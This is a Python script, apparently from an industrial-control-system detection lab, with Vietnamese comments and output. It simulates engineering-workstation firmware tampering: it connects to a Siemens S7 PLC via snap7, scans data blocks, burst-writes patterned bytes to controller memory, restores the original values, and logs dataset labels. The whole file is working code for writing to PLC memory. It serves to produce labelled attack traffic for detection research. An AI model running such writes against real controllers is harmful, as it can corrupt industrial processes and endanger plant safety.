"""
EWS_FIRMWARE_TAMPER
Kỹ thuật: Giả lập firmware upload bất thường — burst write nhanh.
          Tự scan DB, nếu không có thì dùng Marker area.
Observable: S7 burst write đều đặn, pattern giống firmware flash.

Gọi từ bash:
  python -m attacks_ext.ews_firmware_tamper \
      --target 192.168.210.211 --rack 0 --slot 1 --duration 300 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import snap7
import time
from attacks_ext.config_ext import base_parser, write_label

try:
    from snap7.type import Areas
except ImportError:
    from snap7.types import Areas

BURST_COUNT = 10
BURST_INTERVAL = 0.15


def scan_dbs(client, max_db=20):
    found = []
    print("[*] Scanning DB1..DB20...")
    for db_num in range(1, max_db + 1):
        try:
            client.db_read(db_num, 0, 1)
            found.append(db_num)
            print(f"  [+] DB{db_num} ton tai")
        except Exception:
            pass
    return found


def burst_write_db(client, db_num):
    original = bytes(client.db_read(db_num, 0, 10))
    print(f"[*] DB{db_num} goc: {original.hex()}")

    for i in range(BURST_COUNT):
        chunk = bytes([(i * 17) % 256] * 10)
        client.db_write(db_num, 0, chunk)
        print(f"  [CHUNK {i+1:02d}/{BURST_COUNT}] {chunk.hex()}")
        time.sleep(BURST_INTERVAL)

    client.db_write(db_num, 0, original)
    verify = bytes(client.db_read(db_num, 0, 10))
    status = "OK" if verify == original else f"lech: {verify.hex()}"
    print(f"[*] Khoi phuc DB{db_num}: {status}")
    return f"DB{db_num}"


def burst_write_marker(client):
    original = bytes(client.read_area(Areas.MK, 0, 0, 10))
    print(f"[!] Khong co DB — dung Marker area MB0")
    print(f"[*] MB0 goc: {original.hex()}")

    for i in range(BURST_COUNT):
        chunk = bytearray([(i * 17) % 256] * 10)
        client.write_area(Areas.MK, 0, 0, chunk)
        print(f"  [CHUNK {i+1:02d}/{BURST_COUNT}] {chunk.hex()}")
        time.sleep(BURST_INTERVAL)

    client.write_area(Areas.MK, 0, 0, bytearray(original))
    verify = bytes(client.read_area(Areas.MK, 0, 0, 10))
    status = "OK" if verify == original else f"lech: {verify.hex()}"
    print(f"[*] Khoi phuc MB0: {status}")
    return "MK_area"


def run(args):
    label_prefix = "EWS_FIRMWARE_TAMPER"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target}")

    client = snap7.client.Client()
    target_area = "unknown"
    num_rounds = 0

    try:
        client.connect(args.target, args.rack, args.slot)
        print(f"[+] Ket noi PLC thanh cong")

        dbs = scan_dbs(client)
        num_rounds = min(3, max(1, args.duration // 30))

        for round_num in range(num_rounds):
            print(f"\n[ROUND {round_num+1}/{num_rounds}] Bat dau upload burst...")
            if dbs:
                target_area = burst_write_db(client, dbs[0])
            else:
                target_area = burst_write_marker(client)
            time.sleep(5)

        state = client.get_cpu_state()
        print(f"[*] CPU state sau upload: {state}")

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        if client.get_connected():
            client.disconnect()
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"rounds={num_rounds} target={target_area}")


def main():
    p = base_parser("EWS Firmware Tamper Simulation")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
